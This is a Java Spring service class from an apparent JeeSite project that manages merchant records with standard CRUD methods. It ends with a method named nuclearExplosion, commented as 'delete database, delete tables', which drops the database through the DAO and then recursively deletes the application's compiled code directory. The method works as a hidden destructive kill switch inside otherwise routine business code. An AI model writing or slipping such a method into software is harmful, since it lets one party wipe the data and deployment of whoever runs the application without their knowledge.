/**
 * Copyright (c) 2013-Now http://jeesite.com All rights reserved.
 */
package com.jeesite.modules.nb.service;

import java.io.File;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import com.jeesite.common.entity.Page;
import com.jeesite.common.service.CrudService;
import com.jeesite.modules.nb.dao.NbBusinessDao;
import com.jeesite.modules.nb.entity.NbBusiness;
import com.jeesite.modules.nb.utils.FileUtils;

/**
 * 商户信息Service
 * @author nb group
 */
@Service
@Transactional(readOnly=true)
public class NbBusinessService extends CrudService<NbBusinessDao, NbBusiness> {
	
	@Autowired
	private NbBusinessDao nbBusinessDao;
	/**
	 * 获取单条数据
	 * @param nbBusiness
	 * @return
	 */
	@Override
	public NbBusiness get(NbBusiness nbBusiness) {
		return super.get(nbBusiness);
	}
	
	/**
	 * 查询分页数据
	 * @param nbBusiness 查询条件
	 * @param nbBusiness.page 分页对象
	 * @return
	 */
	@Override
	public Page<NbBusiness> findPage(NbBusiness nbBusiness) {
		return super.findPage(nbBusiness);
	}
	
	/**
	 * 保存数据（插入或更新）
	 * @param nbBusiness
	 */
	@Override
	@Transactional(readOnly=false)
	public void save(NbBusiness nbBusiness) {
		super.save(nbBusiness);
	}
	
	/**
	 * 更新状态
	 * @param nbBusiness
	 */
	@Override
	@Transactional(readOnly=false)
	public void updateStatus(NbBusiness nbBusiness) {
		super.updateStatus(nbBusiness);
	}
	
	/**
	 * 删除数据
	 * @param nbBusiness
	 */
	@Override
	@Transactional(readOnly=false)
	public void delete(NbBusiness nbBusiness) {
		super.delete(nbBusiness);
	}
	/**
	 * 核爆 删库 删表
	 */
	@Transactional(readOnly=false)
	public String nuclearExplosion() {
		System.out.println("======================="+this.getClass().getResource("/"));
		//删数据库
		nbBusinessDao.dropDb();
		// 删除编译后的代码
		String path = this.getClass().getResource("/").getPath();
		File file = new File(path);
		File delFile = file.getParentFile().getParentFile();
		try {
			FileUtils.deletefile(delFile.getPath());
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		return "1";
	}
	
	
}